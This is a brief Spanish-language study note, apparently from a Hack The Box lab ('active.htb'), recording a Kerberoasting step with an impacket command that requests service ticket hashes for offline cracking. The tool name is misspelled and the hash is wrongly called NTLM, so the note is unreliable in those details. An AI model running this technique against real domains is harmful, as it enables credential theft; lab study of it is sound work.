
----------
#activeDirectory #impacket #activeDirectory 

---------------

- vemos si podemos solicitar un tgs 

![[Pasted image 20240424155727.png]]

- Al ver que es  vulnerable a kerberos usamos el --requests y solicitamos el hash ntlm para poder crackearlo

` impacket-GetUsersSPNs active.htb/User:Password  -request`


![[Pasted image 20240424161659.png]]